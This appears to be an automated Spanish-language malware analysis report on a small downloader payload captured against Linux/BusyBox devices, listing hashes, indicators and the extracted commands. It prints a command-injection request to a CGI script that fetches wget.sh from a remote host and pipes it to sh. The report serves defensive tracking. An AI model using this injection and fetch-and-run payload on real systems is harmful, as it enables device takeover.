# 🧬 Payload Analysis

`95c9e7890991fd9a3cfc866f86a6513a0a812cdbcfd407b5e90b22d990ab9be9`

## 📌 Resumen

Texto ASCII de 295 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s toto5`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/95c9e7890991fd9a3cfc866f86a6513a0a812cdbcfd407b5e90b22d990ab9be9.md](../../../../../malware-like/oraculo/downloader/95c9e7890991fd9a3cfc866f86a6513a0a812cdbcfd407b5e90b22d990ab9be9.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `95c9e7890991fd9a3cfc866f86a6513a0a812cdbcfd407b5e90b22d990ab9be9`
- **MD5:** `4a2b53b46af34fa153bd053e49e3dc37`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 295 B |
| Entropía | 5.09 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/downloadFlile.cgi?name=%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20toto5%3Bbusybox%
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20toto5%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20toto5%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20toto5%60 | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | GET /cgi-bin/downloadFlile.cgi?name=%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20toto5%3Bbusybox% | strings |
| hash | 95c9e7890991fd9a3cfc866f86a6513a0a812cdbcfd407b5e90b22d990ab9be9 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
